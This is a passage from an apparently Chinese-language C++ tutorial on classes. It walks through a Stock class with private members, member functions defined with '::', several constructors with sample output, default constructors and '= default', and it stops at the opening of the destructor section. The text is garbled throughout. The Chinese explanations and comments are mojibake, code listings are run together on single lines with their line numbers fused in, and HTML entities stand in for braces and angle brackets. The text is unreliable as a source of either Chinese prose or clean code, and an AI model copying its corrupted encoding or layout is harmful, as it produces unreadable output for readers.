æ•°æ®æˆå‘˜é€šå¸¸æ˜¯ç§æœ‰çš„ std::string company; long shares; double share_val; double total_val; // ä¸€ä¸ªç§æœ‰è¾…åŠ©å‡½æ•°ï¼Œåªèƒ½åœ¨ç±»å†…éƒ¨è°ƒç”¨ void set_tot() &#123; total_val = shares * share_val; &#125;public: // æˆå‘˜å‡½æ•°é€šå¸¸æ˜¯å…¬æœ‰çš„ï¼Œæ„æˆæ¥å£ // å‡½æ•°åŸå‹ (å£°æ˜) void acquire(const std::string &amp;co, long n, double pr); // ä¹°å…¥è‚¡ç¥¨ void buy(long num, double price); // å¢æŒè‚¡ç¥¨ void sell(long num, double price); // å–å‡ºè‚¡ç¥¨ void update(double price); // æ›´æ–°è‚¡ä»· void show() const; // æ˜¾ç¤ºè‚¡ç¥¨ä¿¡æ¯ (constè¡¨æ˜æ­¤å‡½æ•°ä¸ä¿®æ”¹å¯¹è±¡)&#125;; // ç±»å®šä¹‰ç»“æŸ è¿™ä¸ª Stock ç±»å®šä¹‰äº†ä¸€ä¸ªæ–°çš„æ•°æ®ç±»å‹ã€‚å®ƒå°è£…äº†è‚¡ç¥¨ç›¸å…³çš„æ•°æ® (company, shares, share_val, total_val) å’Œæ“ä½œè¿™äº›æ•°æ®çš„å‡½æ•° (acquire, buy, sell, update, show)ã€‚æ•°æ®æˆå‘˜è¢«è®¾ä¸º privateï¼Œå¤–éƒ¨ä»£ç ä¸èƒ½ç›´æ¥è®¿é—®å®ƒä»¬ï¼Œåªèƒ½é€šè¿‡ public çš„æˆå‘˜å‡½æ•°æ¥äº¤äº’ã€‚set_tot() æ˜¯ä¸€ä¸ªå†…éƒ¨è¾…åŠ©å‡½æ•°ï¼Œä¹Ÿè¢«è®¾ä¸º privateã€‚ 10.2.3 å®ç°ç±»æˆå‘˜å‡½æ•°ç±»å®šä¹‰é€šå¸¸åªåŒ…å«æˆå‘˜å‡½æ•°çš„å£°æ˜ï¼ˆåŸå‹ï¼‰ã€‚å‡½æ•°çš„å®šä¹‰ï¼ˆå®ç°ï¼‰å¯ä»¥æ”¾åœ¨ç±»å£°æ˜çš„å†…éƒ¨ï¼ˆå¦‚æœå‡½æ•°å¾ˆç®€å•ï¼Œå¯ä»¥ä½œä¸ºå†…è”å‡½æ•°ï¼‰ï¼Œæˆ–è€…æ›´å¸¸è§åœ°ï¼Œæ”¾åœ¨ç±»å£°æ˜çš„å¤–éƒ¨ï¼ˆé€šå¸¸åœ¨å¯¹åº”çš„æºæ–‡ä»¶ .cpp ä¸­ï¼‰ã€‚ å½“åœ¨ç±»å¤–éƒ¨å®šä¹‰æˆå‘˜å‡½æ•°æ—¶ï¼Œä½ éœ€è¦ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ :: æ¥æŒ‡æ˜è¿™ä¸ªå‡½æ•°å±äºå“ªä¸ªç±»ã€‚ è¯­æ³•: 123ReturnType ClassName::FunctionName(ParameterList) &#123; // å‡½æ•°ä½“&#125; ç¤ºä¾‹ï¼šå®ç° Stock ç±»çš„æˆå‘˜å‡½æ•° 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374// é€šå¸¸æ”¾åœ¨æºæ–‡ä»¶ (e.g., stock.cpp) ä¸­#include &lt;iostream&gt;#include &quot;stock.h&quot; // åŒ…å«ç±»å®šä¹‰çš„å¤´æ–‡ä»¶// ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ :: æŒ‡æ˜å‡½æ•°å±äº Stock ç±»void Stock::acquire(const std::string &amp;co, long n, double pr) &#123; company = co; if (n &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares can&#x27;t be negative; &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot(); // è°ƒç”¨ç§æœ‰æˆå‘˜å‡½æ•°è®¡ç®—æ€»å€¼&#125;void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; // å‡è®¾æŒ‰æ–°ä»·æ ¼è®¡ç®— set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cout &lt;&lt; &quot;You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; // å‡è®¾æŒ‰æ–°ä»·æ ¼è®¡ç®— set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;// æ³¨æ„ const å…³é”®å­—åœ¨å‡½æ•°å®šä¹‰å’Œå£°æ˜ä¸­éƒ½è¦æœ‰void Stock::show() const &#123; // è®¾ç½®è¾“å‡ºæ ¼å¼ std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; // è®¾ç½®ç²¾åº¦ä¸º2ä½å°æ•°æ˜¾ç¤ºæ€»ä»· std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; // æ¢å¤åŸå§‹æ ¼å¼ std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125;// æ³¨æ„ï¼šç§æœ‰æˆå‘˜å‡½æ•° set_tot() ä¹Ÿå¯ä»¥åœ¨ç±»å¤–éƒ¨å®šä¹‰ï¼Œ// ä½†å› ä¸ºå®ƒå¾ˆç®€å•ï¼Œé€šå¸¸ä¼šç›´æ¥åœ¨ç±»å®šä¹‰å†…éƒ¨å®ç°ï¼ˆå¦‚ä¸Šæ‰€ç¤ºï¼‰ï¼Œ// è¿™æ ·å®ƒå°±å¯èƒ½è¢«ç¼–è¯‘å™¨è§†ä¸ºå†…è”å‡½æ•°ã€‚// å¦‚æœåœ¨å¤–éƒ¨å®šä¹‰ï¼š// void Stock::set_tot() &#123;// total_val = shares * share_val;// &#125; const æˆå‘˜å‡½æ•°:åœ¨ show() å‡½æ•°å£°æ˜å’Œå®šä¹‰çš„æœ«å°¾éƒ½æœ‰ const å…³é”®å­—ã€‚è¿™è¡¨æ˜ show() æ˜¯ä¸€ä¸ªå¸¸é‡æˆå‘˜å‡½æ•°ï¼Œå®ƒæ‰¿è¯ºä¸ä¼šä¿®æ”¹è°ƒç”¨å®ƒçš„å¯¹è±¡çš„æ•°æ®æˆå‘˜ã€‚è¿™æ˜¯ä¸€ä¸ªå¥½ä¹ æƒ¯ï¼Œå¯ä»¥æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå®‰å…¨æ€§ï¼Œå¹¶å…è®¸å¯¹ const å¯¹è±¡è°ƒç”¨æ­¤å‡½æ•°ã€‚ 10.2.4 ä½¿ç”¨ç±»ä¸€æ—¦å®šä¹‰äº†ç±»ï¼ˆè“å›¾ï¼‰ï¼Œä½ å°±å¯ä»¥åˆ›å»ºè¯¥ç±»çš„å¯¹è±¡ (Objects) æˆ–**å®ä¾‹ (Instances)**ã€‚åˆ›å»ºå¯¹è±¡å°±åƒå£°æ˜ä¸€ä¸ªåŸºæœ¬ç±»å‹çš„å˜é‡ä¸€æ ·ã€‚ 123456789101112131415161718192021222324252627// åœ¨ main() å‡½æ•°æˆ–å…¶ä»–å‡½æ•°ä¸­#include &quot;stock.h&quot; // éœ€è¦åŒ…å«ç±»å®šä¹‰int main() &#123; // åˆ›å»ºä¸¤ä¸ª Stock å¯¹è±¡ (å®ä¾‹) Stock stock1; Stock stock2; // ä½¿ç”¨ç‚¹å· . (æˆå‘˜è®¿é—®è¿ç®—ç¬¦) è°ƒç”¨å¯¹è±¡çš„å…¬æœ‰æˆå‘˜å‡½æ•° stock1.acquire(&quot;NanoSmart&quot;, 20, 12.50); stock1.show(); // æ˜¾ç¤º stock1 çš„ä¿¡æ¯ stock2.acquire(&quot;Boffo Objects&quot;, 2, 180.0); stock2.show(); // æ˜¾ç¤º stock2 çš„ä¿¡æ¯ stock2.buy(5, 190.0); // å¢æŒ stock2 stock2.show(); stock1.sell(10, 15.75); // å–å‡ºéƒ¨åˆ† stock1 stock1.show(); // é”™è¯¯ï¼ä¸èƒ½ç›´æ¥è®¿é—®ç§æœ‰æˆå‘˜ // stock1.shares = 50; // ç¼–è¯‘é”™è¯¯ // std::cout &lt;&lt; stock1.company; // ç¼–è¯‘é”™è¯¯ return 0;&#125; Stock stock1; åˆ›å»ºäº†ä¸€ä¸ªåä¸º stock1 çš„ Stock ç±»å‹çš„å¯¹è±¡ã€‚ ä½¿ç”¨æˆå‘˜è®¿é—®è¿ç®—ç¬¦ï¼ˆç‚¹å· .ï¼‰æ¥è°ƒç”¨å¯¹è±¡çš„å…¬æœ‰æˆå‘˜å‡½æ•°ï¼Œä¾‹å¦‚ stock1.acquire(...) æˆ– stock2.show()ã€‚ æ¯ä¸ªå¯¹è±¡éƒ½æœ‰è‡ªå·±çš„ä¸€å¥—æ•°æ®æˆå‘˜ã€‚stock1 çš„ shares å’Œ stock2 çš„ shares æ˜¯ç›¸äº’ç‹¬ç«‹çš„ã€‚ ä½ ä¸èƒ½ä»å¯¹è±¡å¤–éƒ¨ç›´æ¥è®¿é—® private æˆå‘˜ï¼Œè¿™å¼ºåˆ¶ä½ å¿…é¡»é€šè¿‡ç±»æä¾›çš„å…¬å…±æ¥å£ï¼ˆpublic å‡½æ•°ï¼‰æ¥ä¸å¯¹è±¡äº¤äº’ã€‚ 10.2.5 ä¿®æ”¹å®ç°å°†ç±»çš„æ¥å£ï¼ˆå¤´æ–‡ä»¶ä¸­çš„å£°æ˜ï¼‰å’Œå®ç°ï¼ˆæºæ–‡ä»¶ä¸­çš„å®šä¹‰ï¼‰åˆ†å¼€çš„ä¸€ä¸ªä¸»è¦å¥½å¤„æ˜¯å°è£…å¸¦æ¥çš„çµæ´»æ€§ã€‚ æ¥å£ (Interface): å¤´æ–‡ä»¶ (stock.h) å®šä¹‰äº†å¦‚ä½•ä½¿ç”¨è¿™ä¸ªç±»ï¼ˆå…¬å…±æˆå‘˜å‡½æ•°ï¼‰ã€‚ä½¿ç”¨ç±»çš„ä»£ç ï¼ˆå¦‚ main() å‡½æ•°ï¼‰åªéœ€è¦åŒ…å«å¤´æ–‡ä»¶ã€‚ å®ç° (Implementation): æºæ–‡ä»¶ (stock.cpp) åŒ…å«äº†æˆå‘˜å‡½æ•°å…·ä½“å¦‚ä½•å·¥ä½œã€‚ åªè¦ç±»çš„å…¬å…±æ¥å£ä¿æŒä¸å˜ï¼ˆå‡½æ•°åã€å‚æ•°ã€è¿”å›ç±»å‹ä¸å˜ï¼‰ï¼Œä½ å°±å¯ä»¥è‡ªç”±åœ°ä¿®æ”¹æºæ–‡ä»¶ä¸­çš„å®ç°ç»†èŠ‚ï¼ˆä¾‹å¦‚ï¼Œæ”¹è¿› set_tot çš„è®¡ç®—æ–¹å¼ï¼Œæˆ–è€…æ”¹å˜å†…éƒ¨æ•°æ®çš„å­˜å‚¨æ–¹å¼ï¼‰ï¼Œè€Œä¸éœ€è¦ä¿®æ”¹æˆ–é‡æ–°ç¼–è¯‘ä½¿ç”¨è¯¥ç±»çš„å…¶ä»–ä»£ç æ–‡ä»¶ï¼ˆå¦‚åŒ…å« main() çš„æ–‡ä»¶ï¼‰ã€‚åªéœ€è¦é‡æ–°ç¼–è¯‘å®ç°æ–‡ä»¶ (stock.cpp) å¹¶é‡æ–°é“¾æ¥å³å¯ã€‚ è¿™å¤§å¤§é™ä½äº†ç»´æŠ¤æˆæœ¬ï¼Œå¹¶ä½¿å¾—ä»£ç åº“æ›´å®¹æ˜“æ›´æ–°å’Œæ”¹è¿›ã€‚ç”¨æˆ·åªå…³å¿ƒâ€œèƒ½åšä»€ä¹ˆâ€ï¼ˆæ¥å£ï¼‰ï¼Œè€Œä¸å¿…å…³å¿ƒâ€œæ€ä¹ˆåšâ€ï¼ˆå®ç°ï¼‰ã€‚ 10.2.6 å°ç»“ æŠ½è±¡æ˜¯å…³æ³¨æœ¬è´¨ã€å¿½ç•¥ç»†èŠ‚çš„ç¼–ç¨‹æ€æƒ³ã€‚ ç±»æ˜¯C++å®ç°æŠ½è±¡å’Œåˆ›å»ºç”¨æˆ·å®šä¹‰ç±»å‹çš„ä¸»è¦æœºåˆ¶ã€‚ ç±»å°†æ•°æ®ï¼ˆæˆå‘˜å˜é‡ï¼‰å’Œæ“ä½œæ•°æ®çš„å‡½æ•°ï¼ˆæˆå‘˜å‡½æ•°ï¼‰æ†ç»‘åœ¨ä¸€èµ·ã€‚ è®¿é—®è¯´æ˜ç¬¦ï¼ˆpublic, private, protectedï¼‰æ§åˆ¶å¯¹ç±»æˆå‘˜çš„è®¿é—®ã€‚ æ•°æ®éšè—ï¼ˆé€šå¸¸å°†æ•°æ®è®¾ä¸º privateï¼‰æ˜¯å°è£…çš„å…³é”®ï¼Œä¿æŠ¤æ•°æ®å¹¶éšè—å®ç°ç»†èŠ‚ã€‚ å…¬å…±æ¥å£ï¼ˆpublic æˆå‘˜å‡½æ•°ï¼‰å®šä¹‰äº†å¦‚ä½•ä¸ç±»çš„å¯¹è±¡äº¤äº’ã€‚ æˆå‘˜å‡½æ•°é€šå¸¸åœ¨ç±»å¤–éƒ¨ä½¿ç”¨ä½œç”¨åŸŸè§£æè¿ç®—ç¬¦ :: æ¥å®šä¹‰ã€‚ ä½¿ç”¨ç‚¹å· . è®¿é—®å¯¹è±¡çš„å…¬æœ‰æˆå‘˜ã€‚ å°†æ¥å£å’Œå®ç°åˆ†ç¦»ï¼ˆå¤´æ–‡ä»¶/æºæ–‡ä»¶ï¼‰å¯ä»¥æé«˜ä»£ç çš„æ¨¡å—åŒ–å’Œå¯ç»´æŠ¤æ€§ã€‚ 10.3 ç±»çš„æ„é€ å‡½æ•°å’Œææ„å‡½æ•°åœ¨ä¸Šä¸€èŠ‚ä¸­ï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ª Stock ç±»ï¼Œå¹¶é€šè¿‡ acquire() æˆå‘˜å‡½æ•°æ¥è®¾ç½®å…¶åˆå§‹çŠ¶æ€ã€‚ç„¶è€Œï¼ŒC++ æä¾›äº†ä¸€ç§æ›´è‡ªåŠ¨åŒ–ã€æ›´ä¸“é—¨åŒ–çš„æ–¹å¼æ¥å¤„ç†å¯¹è±¡çš„åˆå§‹åŒ–å’Œæ¸…ç†å·¥ä½œï¼šæ„é€ å‡½æ•° (Constructor) å’Œ **ææ„å‡½æ•° (Destructor)**ã€‚ 10.3.1 å£°æ˜å’Œå®šä¹‰æ„é€ å‡½æ•°æ„é€ å‡½æ•°æ˜¯ä¸€ç§ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯åœ¨åˆ›å»ºç±»çš„å¯¹è±¡æ—¶åˆå§‹åŒ–è¯¥å¯¹è±¡çš„æ•°æ®æˆå‘˜ã€‚ ç‰¹ç‚¹ä¸è§„åˆ™: åç§°ä¸ç±»åç›¸åŒ: æ„é€ å‡½æ•°çš„åç§°å¿…é¡»ä¸å®ƒæ‰€å±çš„ç±»çš„åç§°å®Œå…¨ä¸€æ ·ã€‚ æ²¡æœ‰è¿”å›ç±»å‹: æ„é€ å‡½æ•°æ²¡æœ‰å£°æ˜è¿”å›ç±»å‹ï¼Œè¿ void ä¹Ÿæ²¡æœ‰ã€‚ è‡ªåŠ¨è°ƒç”¨: å½“åˆ›å»ºç±»çš„å¯¹è±¡æ—¶ï¼Œç¨‹åºä¼šè‡ªåŠ¨è°ƒç”¨ç›¸åº”çš„æ„é€ å‡½æ•°ã€‚ å¯ä»¥é‡è½½: ä¸€ä¸ªç±»å¯ä»¥æœ‰å¤šä¸ªæ„é€ å‡½æ•°ï¼Œåªè¦å®ƒä»¬çš„å‚æ•°åˆ—è¡¨ä¸åŒï¼ˆå‚æ•°ä¸ªæ•°ã€ç±»å‹æˆ–é¡ºåºä¸åŒï¼‰ã€‚è¿™å…è®¸ä»¥ä¸åŒçš„æ–¹å¼åˆå§‹åŒ–å¯¹è±¡ã€‚ å£°æ˜è¯­æ³• (åœ¨ç±»å®šä¹‰å†…): 12345678class ClassName &#123;public: // æ„é€ å‡½æ•°å£°æ˜ (æ— å‚æ•°) ClassName(); // æ„é€ å‡½æ•°å£°æ˜ (å¸¦å‚æ•°) ClassName(ParameterList); // ... å…¶ä»–æˆå‘˜ ...&#125;; å®šä¹‰è¯­æ³• (åœ¨ç±»å¤–éƒ¨): 123456789// æ— å‚æ•°æ„é€ å‡½æ•°å®šä¹‰ClassName::ClassName() &#123; // åˆå§‹åŒ–ä»£ç &#125;// å¸¦å‚æ•°æ„é€ å‡½æ•°å®šä¹‰ClassName::ClassName(ParameterList) &#123; // ä½¿ç”¨å‚æ•°è¿›è¡Œåˆå§‹åŒ–&#125; ç¤ºä¾‹ï¼šä¸º Stock ç±»æ·»åŠ æ„é€ å‡½æ•° æˆ‘ä»¬å¯ä»¥ä¸º Stock ç±»æ·»åŠ æ„é€ å‡½æ•°æ¥æ›¿ä»£ä¹‹å‰çš„ acquire() å‡½æ•°çš„éƒ¨åˆ†åŠŸèƒ½ï¼Œç¡®ä¿å¯¹è±¡åœ¨åˆ›å»ºæ—¶å°±è¢«èµ‹äºˆæœ‰æ„ä¹‰çš„åˆå§‹å€¼ã€‚ 123456789101112131415161718192021// åœ¨ stock.h çš„ç±»å®šä¹‰ä¸­å£°æ˜class Stock &#123;private: std::string company; long shares; double share_val; double total_val; void set_tot() &#123; total_val = shares * share_val; &#125;public: // æ„é€ å‡½æ•°å£°æ˜ (ä¸¤ä¸ªç‰ˆæœ¬) Stock(); // é»˜è®¤æ„é€ å‡½æ•° (æ— å‚æ•°) Stock(const std::string &amp;co, long n = 0, double pr = 0.0); // å¸¦å‚æ•°çš„æ„é€ å‡½æ•° (ä½¿ç”¨é»˜è®¤å‚æ•°) // ä¸å†éœ€è¦ acquire()ï¼Œå› ä¸ºæ„é€ å‡½æ•°å¤„ç†äº†åˆå§‹è®¾ç½® // void acquire(const std::string &amp;co, long n, double pr); void buy(long num, double price); void sell(long num, double price); void update(double price); void show() const;&#125;; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475// åœ¨ stock.cpp ä¸­å®šä¹‰æ„é€ å‡½æ•°#include &lt;iostream&gt;#include &quot;stock.h&quot;// é»˜è®¤æ„é€ å‡½æ•°å®šä¹‰Stock::Stock() &#123; // é»˜è®¤æ„é€ å‡½æ•° std::cout &lt;&lt; &quot;Default constructor called\\n&quot;; // åªæ˜¯ä¸ºäº†æ¼”ç¤º company = &quot;no name&quot;; shares = 0; share_val = 0.0; total_val = 0.0;&#125;// å¸¦å‚æ•°çš„æ„é€ å‡½æ•°å®šä¹‰Stock::Stock(const std::string &amp;co, long n, double pr) &#123; std::cout &lt;&lt; &quot;Constructor using &quot; &lt;&lt; co &lt;&lt; &quot; called\\n&quot;; // åªæ˜¯ä¸ºäº†æ¼”ç¤º company = co; if (n &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares can&#x27;t be negative; &quot; &lt;&lt; company &lt;&lt; &quot; shares set to 0.\\n&quot;; shares = 0; &#125; else &#123; shares = n; &#125; share_val = pr; set_tot();&#125;// ... buy(), sell(), update(), show() çš„å®šä¹‰ä¿æŒä¸å˜ ...// (æ³¨æ„ï¼šbuy, sell, update å†…éƒ¨çš„ set_tot() è°ƒç”¨ä»ç„¶éœ€è¦)void Stock::buy(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares purchased can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares += num; share_val = price; set_tot(); &#125;&#125;void Stock::sell(long num, double price) &#123; if (num &lt; 0) &#123; std::cout &lt;&lt; &quot;Number of shares sold can&#x27;t be negative. &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else if (num &gt; shares) &#123; std::cout &lt;&lt; &quot;You can&#x27;t sell more than you have! &quot; &lt;&lt; &quot;Transaction aborted.\\n&quot;; &#125; else &#123; shares -= num; share_val = price; set_tot(); &#125;&#125;void Stock::update(double price) &#123; share_val = price; set_tot();&#125;void Stock::show() const &#123; std::ios_base::fmtflags orig = std::cout.setf(std::ios_base::fixed, std::ios_base::floatfield); std::streamsize prec = std::cout.precision(3); std::cout &lt;&lt; &quot;Company: &quot; &lt;&lt; company &lt;&lt; &quot; Shares: &quot; &lt;&lt; shares &lt;&lt; &#x27;\\n&#x27;; std::cout &lt;&lt; &quot; Share Price: $&quot; &lt;&lt; share_val; std::cout.precision(2); std::cout &lt;&lt; &quot; Total Worth: $&quot; &lt;&lt; total_val &lt;&lt; &#x27;\\n&#x27;; std::cout.setf(orig, std::ios_base::floatfield); std::cout.precision(prec);&#125; 10.3.2 ä½¿ç”¨æ„é€ å‡½æ•°å½“åˆ›å»ºå¯¹è±¡æ—¶ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨é€‰æ‹©åŒ¹é…çš„æ„é€ å‡½æ•°æ¥æ‰§è¡Œã€‚ 1234567891011121314151617181920212223242526272829303132#include &quot;stock.h&quot; // åŒ…å« Stock ç±»å®šä¹‰int main() &#123; // è°ƒç”¨å¸¦å‚æ•°çš„æ„é€ å‡½æ•° Stock(const std::string &amp;co, long n, double pr) Stock stock1(&quot;NanoSmart&quot;, 12, 20.0); // æ˜¾å¼æä¾›æ‰€æœ‰å‚æ•° stock1.show(); // è°ƒç”¨å¸¦å‚æ•°çš„æ„é€ å‡½æ•°ï¼Œåˆ©ç”¨äº† n å’Œ pr çš„é»˜è®¤å€¼ (n=0, pr=0.0) Stock stock2(&quot;Boffo Objects&quot;); // ç­‰åŒäº Stock(&quot;Boffo Objects&quot;, 0, 0.0) stock2.show(); // è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° Stock() Stock stock3; // æ³¨æ„ï¼šè¿™é‡Œä¸èƒ½å†™ stock3() stock3.show(); // ä¹Ÿå¯ä»¥ä½¿ç”¨ C++11 çš„åˆ—è¡¨åˆå§‹åŒ– Stock stock4 = &#123;&quot;Fleep Enterprises&quot;, 100, 1.25&#125;; // è°ƒç”¨å¸¦å‚æ•°æ„é€ å‡½æ•° stock4.show(); Stock stock5&#123;&quot;Dummy Corp&quot;&#125;; // è°ƒç”¨å¸¦å‚æ•°æ„é€ å‡½æ•° (åˆ©ç”¨é»˜è®¤å€¼) stock5.show(); Stock stock6&#123;&#125;; // è°ƒç”¨é»˜è®¤æ„é€ å‡½æ•° Stock() stock6.show(); // åŠ¨æ€åˆ†é…å¯¹è±¡æ—¶ä¹Ÿä¼šè°ƒç”¨æ„é€ å‡½æ•° Stock *p_stock = new Stock(&quot;Electroshock Games&quot;, 18, 19.0); p_stock-&gt;show(); delete p_stock; // ç¨åä¼šçœ‹åˆ° delete ä¼šè°ƒç”¨ææ„å‡½æ•° return 0;&#125; è¾“å‡ºå¯èƒ½åŒ…å« (å–å†³äºç¼–è¯‘å™¨å’Œä¼˜åŒ–): 123456789101112131415161718192021Constructor using NanoSmart calledCompany: NanoSmart Shares: 12 Share Price: $20.000 Total Worth: $240.00Constructor using Boffo Objects calledCompany: Boffo Objects Shares: 0 Share Price: $0.000 Total Worth: $0.00Default constructor calledCompany: no name Shares: 0 Share Price: $0.000 Total Worth: $0.00Constructor using Fleep Enterprises calledCompany: Fleep Enterprises Shares: 100 Share Price: $1.250 Total Worth: $125.00Constructor using Dummy Corp calledCompany: Dummy Corp Shares: 0 Share Price: $0.000 Total Worth: $0.00Default constructor calledCompany: no name Shares: 0 Share Price: $0.000 Total Worth: $0.00Constructor using Electroshock Games calledCompany: Electroshock Games Shares: 18 Share Price: $19.000 Total Worth: $342.00 10.3.3 é»˜è®¤æ„é€ å‡½æ•°é»˜è®¤æ„é€ å‡½æ•° (Default Constructor) æ˜¯æŒ‡ä¸æ¥å—ä»»ä½•å‚æ•°çš„æ„é€ å‡½æ•°ã€‚ ç¼–è¯‘å™¨ç”Ÿæˆçš„é»˜è®¤æ„é€ å‡½æ•°: å¦‚æœä½ æ²¡æœ‰ä¸ºç±»å®šä¹‰ä»»ä½•æ„é€ å‡½æ•°ï¼Œç¼–è¯‘å™¨ä¼šè‡ªåŠ¨ä¸ºä½ ç”Ÿæˆä¸€ä¸ªé»˜è®¤æ„é€ å‡½æ•°ã€‚è¿™ä¸ªåˆæˆçš„æ„é€ å‡½æ•°ä»€ä¹ˆä¹Ÿä¸åšï¼ˆå¯¹äºå†…ç½®ç±»å‹æˆå‘˜ä¸ä¼šåˆå§‹åŒ–ï¼Œå¯¹äºç±»ç±»å‹æˆå‘˜ä¼šè°ƒç”¨å…¶é»˜è®¤æ„é€ å‡½æ•°ï¼‰ã€‚ ç”¨æˆ·å®šä¹‰çš„é»˜è®¤æ„é€ å‡½æ•°: å¦‚æœä½ å®šä¹‰äº†ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ å‡½æ•°ï¼ˆå¦‚ä¸Šé¢ Stock::Stock()ï¼‰ï¼Œé‚£ä¹ˆå®ƒå°±æ˜¯é»˜è®¤æ„é€ å‡½æ•°ã€‚ é‡è¦è§„åˆ™: å¦‚æœä½ ä¸ºç±»å®šä¹‰äº†ä»»ä½•æ„é€ å‡½æ•°ï¼ˆå³ä½¿æ˜¯å¸¦å‚æ•°çš„ï¼‰ï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šå†è‡ªåŠ¨ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°äº†ã€‚å¦‚æœä½ è¿˜éœ€è¦ä¸€ä¸ªæ— å‚æ•°çš„æ„é€ å‡½æ•°ï¼ˆä¾‹å¦‚ï¼Œä¸ºäº†èƒ½åˆ›å»º Stock stock3; è¿™æ ·çš„å¯¹è±¡ï¼‰ï¼Œä½ å°±å¿…é¡»æ˜¾å¼åœ°å®šä¹‰å®ƒã€‚ åœ¨æˆ‘ä»¬çš„ Stock ç¤ºä¾‹ä¸­ï¼Œå› ä¸ºæˆ‘ä»¬å®šä¹‰äº† Stock(const std::string &amp;co, ...)ï¼Œç¼–è¯‘å™¨å°±ä¸ä¼šè‡ªåŠ¨ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å¿…é¡»è‡ªå·±æä¾› Stock::Stock()ï¼Œå¦åˆ™ Stock stock3; è¿™æ ·çš„å£°æ˜å°†å¯¼è‡´ç¼–è¯‘é”™è¯¯ã€‚ C++11 = default: å¦‚æœä½ å®šä¹‰äº†å…¶ä»–æ„é€ å‡½æ•°ï¼Œä½†ä»å¸Œæœ›ç¼–è¯‘å™¨ä¸ºä½ ç”Ÿæˆé»˜è®¤çš„ã€è¡Œä¸ºç®€å•çš„é»˜è®¤æ„é€ å‡½æ•°ï¼Œå¯ä»¥ä½¿ç”¨ = defaultã€‚ 1234567class Example &#123;public: Example(int v) : value(v) &#123;&#125; // ç”¨æˆ·å®šä¹‰çš„å¸¦å‚æ„é€ å‡½æ•° Example() = default; // æ˜¾å¼è¦æ±‚ç¼–è¯‘å™¨ç”Ÿæˆé»˜è®¤æ„é€ å‡½æ•°private: int value;&#125;; 10.3.4 ææ„å‡½æ•°ææ„å‡½æ•° (Destructor) æ˜¯å¦ä¸€ç§ç‰¹æ®Šçš„æˆå‘˜å‡½æ•°ï¼Œå®ƒçš„ä¸»è¦ç›®çš„æ˜¯åœ¨å¯¹è±¡ç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶æ‰§è¡Œæ¸…ç†å·¥ä½œã€‚ ç”¨é€”: é‡Šæ”¾å¯¹è±¡åœ¨ç”Ÿå‘½å‘¨æœŸå†…åˆ†é…çš„èµ„æºï¼ˆä¾‹å¦‚ï¼Œé€šè¿‡ new åˆ†é…çš„å†…å­˜ï¼‰ã€‚ æ‰§è¡Œä»»ä½•å¿…è¦çš„å…³é—­æ“ä½œï¼ˆä¾‹å¦‚ï¼Œå…³é—­æ–‡ä»¶ã€æ–­å¼€ç½‘ç»œè¿æ¥ï¼‰ã€‚ ç‰¹ç‚¹ä¸è§„åˆ™: åç§°: ææ„å‡½æ•°çš„åç§°æ˜¯åœ¨ç±»åå‰åŠ ä¸Šæ³¢æµªå· ~ï¼ˆä¾‹å¦‚ ~Stockï¼‰ã€‚ æ²¡æœ‰è¿”å›ç±»å‹: å’Œæ„é€ å‡½æ•°ä¸€æ ·ï¼Œææ„å‡½æ•°ä¹Ÿæ²¡æœ‰è¿”å›ç±»å‹ï¼Œè¿ void ä¹Ÿæ²¡æœ‰ã€‚ æ²¡æœ‰å‚æ•°: ææ„å‡½æ•°ä¸èƒ½æ¥å—ä»»ä½•å‚æ•°ï¼Œå› æ­¤ä¸èƒ½è¢«é‡è½½ã€‚ä¸€ä¸ªç±»æœ€å¤šåªæœ‰ä¸€ä¸ªææ„å‡½æ•°ã€‚ è‡ªåŠ¨è°ƒç”¨: å½“å¯¹è±¡è¢«é”€æ¯æ—¶ï¼Œææ„å‡½æ•°ä¼šè‡ªåŠ¨è¢«è°ƒç”¨ã€‚è¿™å‘ç”Ÿåœ¨ï¼š 